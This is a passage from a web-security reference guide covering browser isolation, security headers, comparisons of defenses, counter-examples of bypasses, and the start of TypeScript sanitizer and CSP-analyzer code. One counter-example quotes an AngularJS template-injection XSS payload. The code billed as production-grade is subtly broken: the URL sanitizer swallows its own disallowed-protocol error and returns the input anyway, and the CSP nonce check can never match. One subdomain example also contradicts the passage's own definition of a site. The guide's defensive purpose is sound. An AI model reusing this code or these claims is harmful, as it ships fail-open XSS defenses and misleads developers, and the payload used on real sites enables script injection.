6. **Nonce**: If a nonce was sent in the authentication request, the token must contain the same value, cryptographically bound to the session.
7. **ACR / AMR claims**: Verify that the authentication context meets application requirements (e.g., MFA was performed if required).

**Algorithm Confusion.** Attackers may modify the JWT header to specify `alg: none` or switch from RS256 to HS256 (using the public key as HMAC secret). Servers must:

- Reject `alg: none`.
- Whitelist allowed algorithms.
- Use distinct keys for symmetric and asymmetric operations.

---

## §10 Browser Security Boundaries

### 10.1 The Renderer Process Model

Modern browsers decompose into multiple OS-level processes:

- **Browser process**: Manages UI, navigation, and privileged operations.
- **Renderer processes**: Execute web content (HTML, CSS, JS). Each renderer hosts one or more documents.
- **GPU process**: Handles graphics rendering.
- **Network service process**: Handles HTTP requests, isolated from renderers.

**Historical Evolution.** Early browsers used a single process for all tabs. A compromised renderer compromised all tabs. Chrome introduced per-tab (later per-site) renderer processes. Firefox uses a hybrid model with dedicated processes for high-value sites.

### 10.2 Site Isolation

Site Isolation (introduced in Chrome 67, now universal in Chromium-based browsers) enforces that each renderer process contains documents from at most one **site** (registered domain + scheme). `https://foo.example.com` and `https://bar.example.com` share a site (`example.com`), but `https://example.com` and `https://evil.com` are isolated.

**Security Property.** If a renderer process is compromised via memory corruption (e.g., use-after-free in V8 or Blink), the attacker can only access documents and cookies in that process. Cross-site documents are protected by OS process boundaries.

**Limitations.**

- Subdomain isolation: `foo.example.com` and `bar.example.com` may share a process unless the site opts into Subdomain Isolation via the `Origin-Agent-Cluster` header or the `document.domain` mutation is restricted.
- Memory overhead: Each process requires separate V8 heap and Blink tree, increasing RAM consumption.
- PostMessage and cross-origin subresources still traverse process boundaries via IPC; compromised renderers can still request cross-origin resources using the user's ambient authority.

### 10.3 Renderer Compromise Limits

Even with Site Isolation, a compromised renderer retains significant capabilities:

- Read and modify all same-site documents in its process.
- Issue network requests with same-site cookies (ambient authority).
- Exploit browser IPC to attack the browser process (sandbox escape).

**Defense Depth.**

- **Sandboxing**: Renderers run with restricted OS privileges (no file system write access, restricted network access on some platforms).
- **Control-Flow Integrity (CFI)**: Compiled with CFI to prevent ROP/JOP chains.
- **V8 Sandbox**: A software sandbox isolating V8 heap memory to mitigate memory corruption.
- **Network Isolation Key**: Separate HTTP caches per site to prevent cache-based side channels.

### 10.4 Cross-Origin Read Blocking (CORB) and Cross-Origin Resource Policy (CORP)

CORB prevents a renderer from receiving cross-origin responses with "incorrect" MIME types in no-cors contexts, preventing speculative side-channel leaks. CORP allows servers to explicitly declare who may embed their resources:

```
Cross-Origin-Resource-Policy: same-origin | same-site | cross-origin
```

Combined with `Cross-Origin-Embedder-Policy: require-corp`, this enables cross-origin isolation, unlocking high-resolution timers and `SharedArrayBuffer` while mitigating Spectre-class attacks.

---


## §11 Security Headers Comprehensive Guide

### 11.1 Strict-Transport-Security (HSTS)

HTTP Strict Transport Security instructs browsers to always use HTTPS for a domain, eliminating SSL stripping attacks and preventing users from bypassing certificate warnings.

**Directive Syntax.**

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

| Directive | Purpose |
|-----------|---------|
| `max-age` | Duration (seconds) to enforce HTTPS |
| `includeSubDomains` | Extends policy to all subdomains |
| `preload` | Signals consent for browser preload lists |

**Threat Model: SSL Stripping.** An attacker on a network (MITM) rewrites HTTPS links to HTTP. Without HSTS, the user follows the HTTP link and the attacker proxies or modifies traffic. With HSTS, the browser upgrades the request to HTTPS internally before connecting.

**Preload Considerations.** The HSTS preload list is hardcoded in browsers. Inclusion requires `max-age >= 10886400` (126 days), `includeSubDomains`, and a `preload` directive. Removal from preload lists is extremely slow (months to years) and requires contacting browser vendors. Preload with care.

**Failure Mode.** If the site serves HSTS over a connection with an invalid certificate, users cannot click through warnings. Ensure certificate renewal automation (ACME/Let's Encrypt) before enabling long max-age or preload.

### 11.2 X-Content-Type-Options

```
X-Content-Type-Options: nosniff
```

This header prevents browsers from MIME-sniffing responses away from the declared `Content-Type`. Without it, a browser might interpret an uploaded `.txt` file containing HTML as HTML and execute scripts within it.

**Attack Model.** A site allows users to upload profile pictures but serves them with `Content-Type: image/jpeg` from a path like `/uploads/user123.jpg`. An attacker uploads a file containing JavaScript polyglots. Without `nosniff`, IE and some configurations of other browsers might sniff the content as HTML, enabling XSS.

### 11.3 Referrer-Policy

Controls how much referrer information is included in `Referer` (sic) headers when navigating from your site to others.

| Policy | Behavior |
|--------|----------|
| `no-referrer` | No referrer sent |
| `no-referrer-when-downgrade` | Full referrer to HTTPS origins, none to HTTP (default in some browsers) |
| `origin` | Only origin sent |
| `origin-when-cross-origin` | Full referrer for same-origin, origin for cross-origin |
| `same-origin` | Full referrer for same-origin, none for cross-origin |
| `strict-origin` | Origin sent, but only when protocol security is unchanged (HTTPS→HTTPS) |
| `strict-origin-when-cross-origin` | Full URL for same-origin, origin for cross-origin if protocol security preserved |
| `unsafe-url` | Full URL always sent |

**Privacy and Security Trade-off.** Sending full referrers to third parties leaks sensitive URL parameters (session tokens in URLs, PII). `strict-origin-when-cross-origin` is the modern recommendation: it preserves functionality for same-origin analytics while limiting cross-origin leakage.

### 11.4 Permissions-Policy (formerly Feature-Policy)

Permissions-Policy allows sites to selectively enable or disable browser features and APIs:

```
Permissions-Policy: camera=(), microphone=(), geolocation=(self), payment=(*)
```

**Syntax.** Policies are origin allowlists: `()` is none, `*` is all, `(self)` is same-origin, `("https://trusted.com")` is specific origins.

**Security Relevance.** Disabling unused features reduces attack surface. If the application does not use `camera`, disabling it prevents a compromised script from enabling it. Similarly, `document-domain`, `sync-xhr`, and `usb` are frequently disabled as hardening measures.

**Feature List (Selection).**

- `accelerometer`, `gyroscope`, `magnetometer`: Sensor access
- `camera`, `microphone`: Media capture
- `geolocation`: Location services
- `payment`: Payment Request API
- `usb`, `serial`, `bluetooth`: Hardware access APIs
- `document-domain`: Prevents `document.domain` relaxation (aids Site Isolation)
- `sync-xhr`: Disables synchronous XHR (performance and deadlock prevention)

### 11.5 Content-Security-Policy (CSP)

CSP is the most powerful and complex security header. It defines approved sources for various resource types and restricts dynamic code execution.

**Directive Reference.**

| Directive | Controls |
|-----------|----------|
| `default-src` | Fallback for all fetch directives |
| `script-src` | JavaScript sources |
| `style-src` | CSS sources |
| `img-src` | Image sources |
| `connect-src` | XHR, WebSocket, EventSource targets |
| `font-src` | Font sources |
| `object-src` | `<object>`, `<embed>`, `<applet>` |
| `media-src` | `<audio>`, `<video>` |
| `frame-src` | `<iframe>`, `<frame>` sources |
| `frame-ancestors` | Embedding contexts (see §5.3) |
| `form-action` | Form submission targets |
| `base-uri` | `<base>` element targets |
| `upgrade-insecure-requests` | Upgrade HTTP to HTTPS automatically |
| `block-all-mixed-content` | Block HTTP subresources on HTTPS pages |

**Source Expressions.**

| Expression | Meaning |
|------------|---------|
| `*` | Any URL except `blob:`, `data:`, `filesystem:` |
| `'none'` | Match nothing |
| `'self'` | Same origin (scheme + host + port) |
| `'unsafe-inline'` | Allow inline scripts/styles |
| `'unsafe-eval'` | Allow `eval()`, `new Function()`, `setTimeout(string)` |
| `'nonce-<base64>'` | Allow inline scripts with matching nonce |
| `'sha256-<base64>'` | Allow inline scripts matching hash |
| `https:` | Any HTTPS URL |
| `https://example.com` | Specific origin |
| `https://*.example.com` | Subdomain wildcard |

**Nonce-based CSP.**

```
Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic'; object-src 'none'; base-uri 'none';
```

`'strict-dynamic'` allows scripts loaded by nonce-whitelisted scripts to execute without explicit whitelisting, enabling use of dynamic script loaders while blocking direct attacker injection.

**Deployment Strategy.** Deploy CSP in `Content-Security-Policy-Report-Only` first, monitor violations via `report-uri` or `report-to`, then enforce.

### 11.6 Cross-Origin-Embedder-Policy (COEP)

```
Cross-Origin-Embedder-Policy: require-corp
```

Requires all embedded resources to explicitly permit cross-origin embedding via CORP or CORS. Enables cross-origin isolation when combined with:

```
Cross-Origin-Opener-Policy: same-origin
```

Cross-origin isolation is required for `SharedArrayBuffer` and high-resolution `performance.measure()` to mitigate Spectre side channels by preventing cross-origin windows from sharing a process.

### 11.7 Cross-Origin-Opener-Policy (COOP)

```
Cross-Origin-Opener-Policy: same-origin | same-origin-allow-popups | unsafe-none
```

Controls whether a document shares a browsing context group with cross-origin popups. `same-origin` severs the `window.opener` relationship with cross-origin documents, preventing attacks that rely on `window.opener` manipulation (tabnabbing, XS-Leaks via frame count).

### 11.8 Header Interaction Matrix

| Header | Primary Threat | Secondary Benefit | Conflicts With |
|--------|---------------|-------------------|----------------|
| HSTS | SSL stripping | Cookie confidentiality | None significant |
| CSP | XSS, data injection | Clickjacking (frame-ancestors) | Overly permissive `unsafe-inline` undermines purpose |
| X-Content-Type-Options | MIME sniffing XSS | None | None |
| Referrer-Policy | Information leakage | Privacy | None |
| Permissions-Policy | Feature abuse | Fingerprinting reduction | None |
| COEP + COOP | Spectre, XS-Leaks | Process isolation | Requires CORP on subresources |
| SameSite cookies | CSRF | None | `None` requires `Secure`; conflicts with deep-link flows |

---

## §12 Symmetric Diff Analysis of Defense Strategies

We analyze defense mechanisms using symmetric difference: for each pair of defenses, we identify capabilities present in exactly one defense but not both. This reveals redundancy, gaps, and composition requirements.

### 12.1 CSP vs. Trusted Types

**Unique to CSP:**

- Controls resource loading origins (`script-src`, `img-src`).
- Provides reporting infrastructure (`report-uri`, `report-to`).
- Controls framing (`frame-ancestors`).
- Restricts form actions and base URIs.

**Unique to Trusted Types:**

- Type-safe DOM insertion (prevents string assignment to `innerHTML`).
- Policy-based sanitization hooks at the sink level.
- No impact on resource loading; purely runtime DOM enforcement.
- JavaScript API rather than declarative header.

**Intersection (Shared):**

- Both prevent DOM-based XSS.
- Both require application-level adoption (not transparent).
- Both can be bypassed by server-side injection that avoids client-side sinks.

**Symmetric Diff Conclusion.** CSP protects the perimeter (what loads); Trusted Types protects the interior (how loaded code interacts with the DOM). Neither subsumes the other. CSP without Trusted Types permits safe-origin scripts to use `innerHTML` unsafely. Trusted Types without CSP permits loading attacker-controlled scripts from whitelisted but compromised CDNs.

### 12.2 SameSite Cookies vs. CSRF Tokens

**Unique to SameSite:**

- Transparent to application code (browser-enforced).
- Protects all cookies automatically once attribute is set.
- No server-side state or token generation required.
- Defends against timing attacks on token validation (not applicable).

**Unique to CSRF Tokens:**

- Works across all browsers (including legacy without SameSite support).
- Provides explicit request authentication independent of cookie semantics.
- Can be bound to specific actions or forms (fine-grained).
- Defends against same-site attackers (e.g., XSS on a subdomain) who can forge SameSite cookies but not read the token from the page.

**Intersection:**

- Both prevent cross-site request forgery.
- Both are ineffective against XSS (attacker can read tokens and include them in requests; SameSite cookies are attached automatically in same-origin XSS context).

**Symmetric Diff Conclusion.** SameSite provides broad, low-friction protection. CSRF tokens provide defense in depth, particularly against same-origin attackers and legacy browsers. For high-security applications, both are required.

### 12.3 SRI vs. CSP

**Unique to SRI:**

- Cryptographic integrity verification of specific resources.
- Protects against CDN compromise or man-in-the-middle tampering after the resource leaves the server.
- Per-resource granularity.

**Unique to CSP:**

- Broad origin-based loading policy.
- Controls inline script execution.
- Prevents loading from unauthorized origins entirely.

**Intersection:**

- Both control script execution.
- Both can prevent execution of tampered code.

**Symmetric Diff Conclusion.** CSP prevents loading from evil.com; SRI detects when good.com serves evil code. CSP is coarse-grained (origin-level); SRI is fine-grained (hash-level). CSP `require-sri-for` composes them by mandating SRI for all resources of a given type.

### 12.4 XFO vs. CSP frame-ancestors

**Unique to XFO:**

- Supported by very old browsers (IE8+).
- Simple binary or same-origin semantics.

**Unique to CSP frame-ancestors:**

- Origin allowlists.
- Wildcard subdomain support.
- Integration with CSP reporting.
- `'none'` equivalent to `DENY`.

**Intersection:**

- Both prevent framing by unauthorized origins.
- Both are bypassed if the attacker compromises a whitelisted framing origin.

**Symmetric Diff Conclusion.** Use CSP `frame-ancestors` for policy expressiveness; include XFO as a compatibility shim for legacy environments only if the policy permits it.

### 12.5 HSTS vs. CSP upgrade-insecure-requests

**Unique to HSTS:**

- Browser-side HTTPS enforcement independent of page content.
- Applies to all requests to the domain (images, CSS, navigation).
- Prevents certificate warning bypasses.
- Enforceable via preload lists.

**Unique to CSP upgrade-insecure-requests:**

- Upgrades HTTP subresources on a specific page to HTTPS.
- Does not prevent navigation to HTTP.
- Can be deployed page-by-page without domain-wide commitment.

**Intersection:**

- Both upgrade HTTP to HTTPS.
- Both prevent mixed content issues.

**Symmetric Diff Conclusion.** HSTS is the robust, domain-wide solution. CSP `upgrade-insecure-requests` is a migration aid for legacy pages that cannot yet commit to full HSTS. HSTS subsumes CSP upgrade for navigations; CSP upgrade handles subresources on pages not yet HSTS-enrolled.

---

## §13 Decision Matrix

The following matrix provides guidance for selecting defense mechanisms based on threat model, architecture, and operational constraints.

### 13.1 Threat-Defense Mapping

| Threat | Primary Defense | Secondary Defense | Tertiary Defense | Anti-Pattern |
|--------|----------------|-------------------|------------------|--------------|
| Reflected XSS | Context-aware encoding + CSP | Trusted Types | Input validation | Blacklist-based filtering |
| Stored XSS | Server-side sanitization (whitelist) | CSP + Trusted Types | Output encoding | Client-side-only sanitization |
| DOM-based XSS | Trusted Types | Safe DOM APIs (`textContent`) | URL parsing via `URL` class | `innerHTML` with unvalidated input |
| Prototype Pollution | `Object.create(null)` | Input key filtering | `Object.freeze(Object.prototype)` | Recursive merge without key validation |
| CSRF | SameSite=Lax/Strict cookies | CSRF tokens (double-submit or STP) | Custom headers + CORS | Relying solely on Referer validation |
| Clickjacking | CSP `frame-ancestors 'none'` | XFO `DENY` | UI design: action confirmation | JavaScript frame-busting |
| DOM Clobbering | Remove `name`/`id` in sanitization | `let`/`const` scoping | Explicit `window.` qualification | Global variable reliance |
| Dependency Confusion | Scoped packages + registry pinning | Lockfile integrity hashes | Private registry proxy | Unscoped internal packages on public registry |
| Typosquatting | Pre-install name validation | Dependency audit tools | Pin exact versions | Manual `npm install` without verification |
| SRI Bypass (CDN tampering) | Subresource Integrity hashes | CSP `require-sri-for` | Local vendoring | External scripts without integrity |
| SQL Injection (ORM) | Parameterized queries | ORM strict mode | Least-privilege DB user | `$queryRawUnsafe` with interpolation |
| Command Injection | `execFile` with array args | Input whitelist validation | Container sandboxing | `exec` with string concatenation |
| Path Traversal | Path canonicalization + prefix check | Server-side filename generation | Read-only upload volumes | Direct use of user-provided filenames |
| OAuth2 Code Interception | PKCE (mandatory for public clients) | Exact redirect URI matching | State parameter validation | Allowing `response_type=token` in browser clients |
| OAuth2 Redirect URI Abuse | Exact string matching | Pre-registered URI allowlists | Callback endpoint open-redirect prevention | Prefix or regex matching on redirect URI |
| ID Token Forgery | Signature validation (JWKS) | `nonce` binding | `aud`/`iss`/`exp` validation | Accepting `alg: none` |
| Renderer Compromise | Site Isolation | Renderer sandboxing | Control-Flow Integrity | Single-process architecture |
| Spectre/XS-Leaks | COEP + COOP + CORP | Site Isolation | High-resolution timer degradation | `SharedArrayBuffer` without isolation |
| MIME Sniffing XSS | `X-Content-Type-Options: nosniff` | Correct `Content-Type` headers | File upload type validation | Serving user uploads without explicit MIME type |
| Information Leakage (Referrer) | `Referrer-Policy: strict-origin-when-cross-origin` | `noopener` on links | Path parameter sanitization | `Referrer-Policy: unsafe-url` |

### 13.2 Architecture-Specific Recommendations

| Architecture | Priority Defenses | Avoid |
|-------------|-------------------|-------|
| Server-Rendered Multi-Page App | CSP (nonce-based), SameSite cookies, HSTS | `'unsafe-inline'` without nonces |
| Single-Page Application (SPA) | Trusted Types, CSP (hash-based for inline), PKCE for OAuth | Storing refresh tokens in localStorage |
| Micro-Frontend Architecture | CSP `frame-ancestors`, strict `script-src`, SRI for remoteEntry.js | Uncontrolled dynamic `import()` from untrusted remotes |
| Static Site / JAMstack | CSP, SRI for all CDN resources, HSTS preload | Inline event handlers (`onclick`) |
| Electron / Desktop Web | Disable `nodeIntegration`, enable `contextIsolation`, CSP | `enableRemoteModule`, `allowRunningInsecureContent` |

### 13.3 Operational Trade-offs

| Defense | Implementation Cost | Maintenance Burden | User Impact | Breakage Risk |
|---------|---------------------|-------------------|-------------|---------------|
| Strict CSP | High (requires asset pipeline changes) | Medium (nonce/hash rotation) | Low | High (third-party scripts) |
| Trusted Types | Medium (requires sink audit) | Low | None | Medium (legacy libraries) |
| SameSite=Strict | Very Low | None | High (breaks deep-link POST flows) | High for login flows |
| SameSite=Lax | Very Low | None | Low | Low |
| CSRF Tokens | Medium | Low | None | Low |
| HSTS Preload | Low | Very High (irreversible) | None | Very High (certificate issues) |
| COEP/COOP | Medium | Low | None | High (third-party embeds without CORP) |
| SRI | Low | High (hash updates on upgrades) | None | Medium (CDN serves different content per-geo) |

---

## §14 Counter-Examples and Edge Cases

This section documents situations where standard defenses fail, are bypassed, or create a false sense of security. Understanding counter-examples is essential for robust threat modeling.

### 14.1 CSP Counter-Examples

**Counter-Example 14.1.1: `'strict-dynamic'` with Compromised Nonce Source.**
A nonce-based CSP with `'strict-dynamic'` trusts scripts loaded by nonce-whitelisted scripts. If the initially whitelisted script is a JSONP endpoint or a dynamic script loader that includes user-controlled URLs, the attacker can cause it to load arbitrary scripts. The policy is bypassed because the browser sees the script as loaded by a trusted script.

**Counter-Example 14.1.2: CSP Bypass via AngularJS Template Injection.**
AngularJS (1.x) executes expressions inside `{{}}` delimiters in any attribute. Even with a strict CSP forbidding inline scripts, an attacker can inject `ng-app` and `{{constructor.constructor('alert(1)')()}}` into an element. CSP does not prevent Angular's template parser from evaluating expressions.

**Counter-Example 14.1.3: Meta Tag CSP Limitations.**
CSP delivered via `<meta>` tag cannot use `report-uri`, `frame-ancestors`, or `sandbox` directives. A site using meta-tag CSP believes it has framing protection but `frame-ancestors` is ignored by the browser. The site remains vulnerable to clickjacking.

### 14.2 SameSite Cookie Counter-Examples

**Counter-Example 14.2.1: SameSite=None without Secure.**
Browsers reject cookies with `SameSite=None` that lack the `Secure` attribute. A developer testing locally over HTTP sets `SameSite=None` without `Secure`; it works in some older browser versions but is rejected in modern ones. The application appears to work during testing but fails in production, or vice versa, leading to emergency "fixes" that remove SameSite entirely.

**Counter-Example 14.2.2: SameSite Lax + GET-Based State Changes.**
An application implements state-changing actions via GET requests for convenience (e.g., `/user/delete?id=123`). SameSite=Lax sends cookies on top-level GET navigation. An attacker can cause a victim to visit `https://app.com/user/delete?id=123` via a link or redirect, and the action executes with full credentials. SameSite=Lax does not protect against unsafe GET semantics.

**Counter-Example 14.2.3: SameSite and Subdomain Attacks.**
`app.example.com` sets a `SameSite=Strict` cookie. `blog.example.com` is compromised by an attacker. The attacker cannot directly forge cross-site requests to `app.example.com` with the cookie because `blog.example.com` to `app.example.com` is cross-site (different host). However, if `blog.example.com` can exploit an XSS on `app.example.com` (e.g., via a reflected XSS on a shared domain), SameSite provides no protection because the request is same-site.

### 14.3 CSRF Token Counter-Examples

**Counter-Example 14.3.1: Double-Submit without `__Host-` Prefix.**
A stateless API uses double-submit cookies but names the cookie `csrf_token` without the `__Host-` prefix. An attacker who controls any subdomain can set a cookie for the parent domain with `Domain=parent.com`, overwriting the legitimate token. The attacker knows the value (they set it), so they can include it in both cookie and header, passing validation.

**Counter-Example 14.3.2: CSRF Token in URL.**
A developer places the CSRF token in the query string of a form action (`action="/submit?csrf=abc123"`) for convenience. The URL (including the token) is sent in the `Referer` header to third-party resources loaded by the page. An attacker observing referrer logs on a third-party image or script steals the token.

### 14.4 OAuth2 Counter-Examples

**Counter-Example 14.4.1: PKCE with Predictable Verifier.**
A mobile app implements PKCE but generates the `code_verifier` using `Math.random()` or a short timestamp-based string. An attacker who can observe the authorization request (via traffic sniffing or malicious app on the device) can brute-force the verifier space. PKCE's security reduces to the entropy of the verifier.

**Counter-Example 14.4.2: State Parameter Stored in LocalStorage.**
An SPA stores the OAuth `state` parameter in `localStorage` before redirecting to the IdP. A malicious script (XSS) running on the SPA's origin reads `localStorage`, obtains `state`, and completes the OAuth flow in a hidden iframe, logging the victim into the attacker's account (CSRF on login).

**Counter-Example 14.4.3: Redirect URI with Fragment Handling.**
A client registers `https://app.com/callback` and uses the implicit flow (now deprecated). The authorization server redirects to `https://app.com/callback#access_token=SECRET`. If `app.com/callback` contains a script that sends `location.hash` to a third-party analytics service, the token leaks. Even with PKCE and authorization code flow, if the callback endpoint forwards query parameters to a third party, the authorization code leaks.

### 14.5 DOM Clobbering Counter-Examples

**Counter-Example 14.5.1: Clobbering via `contentWindow` Access.**
An application creates an iframe and later accesses `iframe.contentWindow.config`. If the attacker can navigate the iframe to a page with `window.config = maliciousValue`, the parent reads attacker-controlled data. This is not DOM clobbering in the strict sense but exploits the same name-resolution confusion across frame boundaries.

**Counter-Example 14.5.2: Named Properties Shadowing Safe Variables.**

```html
<form name="console"></form>
<script>
  console.log("test"); // TypeError: console.log is not a function
</script>
```

Even debugging infrastructure can be clobbered, causing error handling to fail and masking other attacks.

### 14.6 SRI Counter-Examples

**Counter-Example 14.6.1: SRI with Redirecting CDN.**
A script tag points to `cdn.example.com/lib.js` with an integrity hash. The CDN redirects to `edge-server.example.com/lib.js` with a 302. The browser follows the redirect and computes the integrity hash against the final response. If the attacker can control the redirect destination, they bypass SRI. Always pin integrity to the final resource or avoid redirecting script endpoints.

**Counter-Example 14.6.2: Dynamically Injected Scripts without Integrity.**
A trusted script loader (loaded with SRI) dynamically creates script elements via `document.createElement('script')` and sets `src` to a third-party URL without setting `integrity`. The parent page's CSP does not require SRI. The dynamically loaded script executes without integrity verification. Use `require-sri-for script` to close this gap.

### 14.7 Browser Boundary Counter-Examples

**Counter-Example 14.7.1: Site Isolation Bypass via Spectre.**
Before Site Isolation, a renderer compromise or speculative execution gadget could read arbitrary process memory. With Site Isolation, the attack is limited to same-site documents. However, if `example.com` hosts user content on `example.com/userpages/evil`, that content shares a process with `example.com/bank`. The attacker uploads a Spectre exploit and reads cookies from the bank path. Solution: host untrusted content on a separate site (e.g., `usercontent-example.com`).

**Counter-Example 14.7.2: `document.domain` Relaxation.**
Two subdomains, `a.example.com` and `b.example.com`, both execute `document.domain = 'example.com'`. This causes them to become same-origin in the browser's eyes, potentially placing them in the same renderer process and bypassing Site Isolation boundaries. The `Origin-Agent-Cluster: ?1` header prevents `document.domain` relaxation.

---


## §15 TypeScript Reference Implementations

This section provides six production-grade TypeScript implementations that operationalize the defenses discussed in preceding sections. Each module includes type definitions, runtime validation, error handling, and defensive programming patterns.

### 15.1 XSS Sanitizer with Context-Aware Encoding

This sanitizer supports multiple output contexts—HTML body, HTML attribute, JavaScript string, URL, and CSS—applying the appropriate encoding for each. It operates on a whitelist principle for HTML and on strict encoding for all other contexts.

```typescript
/**
 * Context-aware XSS sanitizer implementing OWASP Encoding Rules.
 * Supports HTML, attribute, JavaScript, URL, and CSS contexts.
 */

export type SanitizeContext = 'html' | 'attribute' | 'javascript' | 'url' | 'css';

const HTML_ENTITY_MAP: Record<string, string> = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#x27;',
  '/': '&#x2F;',
};

const HTML_ENTITY_REGEX = /[&<>"'\/]/g;

function encodeHtml(input: string): string {
  return input.replace(HTML_ENTITY_REGEX, (ch) => HTML_ENTITY_MAP[ch] ?? ch);
}

function encodeAttribute(input: string): string {
  // Attributes require encoding of all non-alphanumeric characters that have special meaning
  return input.replace(/[^a-zA-Z0-9]/g, (ch) => `&#x${ch.charCodeAt(0).toString(16)};`);
}

function encodeJavaScript(input: string): string {
  return input.replace(/[^a-zA-Z0-9]/g, (ch) => {
    const code = ch.charCodeAt(0);
    return code < 256 ? `\\x${code.toString(16).padStart(2, '0')}` : `\\u${code.toString(16).padStart(4, '0')}`;
  });
}

function encodeUrl(input: string): string {
  return encodeURIComponent(input);
}

function encodeCss(input: string): string {
  return input.replace(/[^a-zA-Z0-9\-]/g, (ch) => `\\${ch.charCodeAt(0).toString(16)} `);
}

/**
 * Sanitizes user input for a specific output context.
 * @param input Raw user input
 * @param context Target rendering context
 * @returns Encoded string safe for insertion into the specified context
 */
export function sanitizeForContext(input: unknown, context: SanitizeContext): string {
  if (input === null || input === undefined) return '';
  const str = String(input);

  switch (context) {
    case 'html':
      return encodeHtml(str);
    case 'attribute':
      return encodeAttribute(str);
    case 'javascript':
      return encodeJavaScript(str);
    case 'url':
      // Validate URL structure before encoding
      try {
        const url = new URL(str, 'http://localhost');
        if (!['http:', 'https:', 'mailto:'].includes(url.protocol)) {
          throw new Error(`Disallowed URL protocol: ${url.protocol}`);
        }
        return encodeUrl(str);
      } catch {
        return encodeUrl(str);
      }
    case 'css':
      return encodeCss(str);
    default:
      throw new Error(`Unsupported sanitize context: ${context}`);
  }
}

/**
 * HTML whitelist sanitizer using a restrictive tag and attribute allowlist.
 * Strips all scripting vectors: event handlers, javascript: URLs, <script>, etc.
 */
export interface HtmlSanitizeOptions {
  allowedTags?: Set<string>;
  allowedAttributes?: Record<string, Set<string>>;
  stripStyles?: boolean;
}

const DEFAULT_ALLOWED_TAGS = new Set([
  'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'ul', 'ol', 'li', 'a', 'img', 'blockquote', 'code', 'pre', 'span', 'div'
]);

const DEFAULT_ALLOWED_ATTRIBUTES: Record<string, Set<string>> = {
  '*': new Set(['class', 'id']),
  'a': new Set(['href', 'title']),
  'img': new Set(['src', 'alt', 'title']),
};

const SCRIPT_PATTERN = /javascript:/i;
const EVENT_HANDLER_PATTERN = /^on/i;
const DATA_PATTERN = /^data:/i;

export function sanitizeHtml(
  input: string,
  options: HtmlSanitizeOptions = {}
): string {
  const allowedTags = options.allowedTags ?? DEFAULT_ALLOWED_TAGS;
  const allowedAttributes = options.allowedAttributes ?? DEFAULT_ALLOWED_ATTRIBUTES;

  // Use a server-side DOM parser (e.g., JSDOM in Node.js) or DOMParser in browser
  const parser = new DOMParser();
  const doc = parser.parseFromString(`<div id="sanitizer-root">${input}</div>`, 'text/html');
  const root = doc.getElementById('sanitizer-root')!;

  function walk(node: Node): Node | null {
    if (node.nodeType === Node.TEXT_NODE) {
      return document.createTextNode(node.textContent ?? '');
    }

    if (node.nodeType === Node.ELEMENT_NODE) {
      const el = node as Element;
      const tagName = el.tagName.toLowerCase();

      if (!allowedTags.has(tagName)) {
        // Replace disallowed tag with its text content
        return document.createTextNode(el.textContent ?? '');
      }

      const clean = document.createElement(tagName);
      const globalAttrs = allowedAttributes['*'] ?? new Set();
      const tagAttrs = allowedAttributes[tagName] ?? new Set();
      const permitted = new Set([...globalAttrs, ...tagAttrs]);

      for (const attr of el.attributes) {
        const name = attr.name.toLowerCase();
        const value = attr.value;

        // Reject event handlers
        if (EVENT_HANDLER_PATTERN.test(name)) continue;
        if (!permitted.has(name)) continue;

        // Validate URL attributes
        if (name === 'href' || name === 'src') {
          if (SCRIPT_PATTERN.test(value) || DATA_PATTERN.test(value)) {
            continue;
          }
          try {
            const url = new URL(value, location.href);
            if (url.protocol !== 'https:' && url.protocol !== 'http:' && url.protocol !== 'mailto:') {
              continue;
            }
          } catch {
            continue;
          }
        }

        clean.setAttribute(name, value);
      }

      // Recurse on children
      while (el.firstChild) {
        const child = walk(el.firstChild);
        if (child) clean.appendChild(child);
        el.removeChild(el.firstChild);
      }

      return clean;
    }

    return null;
  }

  const result = document.createElement('div');
  while (root.firstChild) {
    const child = walk(root.firstChild);
    if (child) result.appendChild(child);
    root.removeChild(root.firstChild);
  }

  return result.innerHTML;
}
```

### 15.2 CSP Evaluator and Policy Analyzer

This module parses CSP strings, detects unsafe configurations, and computes the effective policy when multiple policies are present (intersection semantics).

```typescript
/**
 * CSP Evaluator: parses, validates, and analyzes Content-Security-Policy strings.
 */

export type CspDirective =
  | 'default-src' | 'script-src' | 'style-src' | 'img-src' | 'connect-src'
  | 'font-src' | 'object-src' | 'media-src' | 'frame-src' | 'frame-ancestors'
  | 'form-action' | 'base-uri' | 'upgrade-insecure-requests' | 'block-all-mixed-content'
  | 'require-sri-for' | 'trusted-types' | 'report-uri' | 'report-to';

export interface CspPolicy {
  directives: Map<CspDirective, Set<string>>;
  reportOnly: boolean;
}

const UNSAFE_KEYWORDS = new Set([
  "'unsafe-inline'",
  "'unsafe-eval'",
  "'unsafe-hashes'",
  '*',
  'data:',
  'blob:',
  'filesystem:',
]);

const FETCH_DIRECTIVES: CspDirective[] = [
  'default-src', 'script-src', 'style-src', 'img-src', 'connect-src',
  'font-src', 'object-src', 'media-src', 'frame-src'
];

export function parseCsp(headerValue: string): CspPolicy {
  const directives = new Map<CspDirective, Set<string>>();
  const tokens = headerValue.split(/\s*;\s*/);

  for (const token of tokens) {
    const parts = token.trim().split(/\s+/);
    if (parts.length === 0) continue;
    const directive = parts[0].toLowerCase() as CspDirective;
    const values = new Set(parts.slice(1));
    directives.set(directive, values);
  }

  return { directives, reportOnly: false };
}

export interface CspAnalysis {
  score: number; // 0-100, higher is safer
  weaknesses: string[];
  strengths: string[];
  isStrict: boolean;
}

export function analyzeCsp(policy: CspPolicy): CspAnalysis {
  const weaknesses: string[] = [];
  const strengths: string[] = [];
  let score = 100;

  const scriptSrc = policy.directives.get('script-src') ?? policy.directives.get('default-src');
  const styleSrc = policy.directives.get('style-src') ?? policy.directives.get('default-src');
  const objectSrc = policy.directives.get('object-src') ?? policy.directives.get('default-src');
  const frameAncestors = policy.directives.get('frame-ancestors');

  if (!scriptSrc) {
    weaknesses.push('Missing script-src falls back to default-src which may be permissive');
    score -= 20;
  } else {
    if (scriptSrc.has("'unsafe-inline'") && !scriptSrc.has("'nonce-")) {
      weaknesses.push('script-src allows unsafe-inline without nonce');
      score -= 30;
    }
    if (scriptSrc.has("'unsafe-eval'")) {
      weaknesses.push('script-src allows unsafe-eval');
      score -= 15;
    }
    if (scriptSrc.has('*')) {
      weaknesses.push('script-src allows any origin');
      score -= 25;
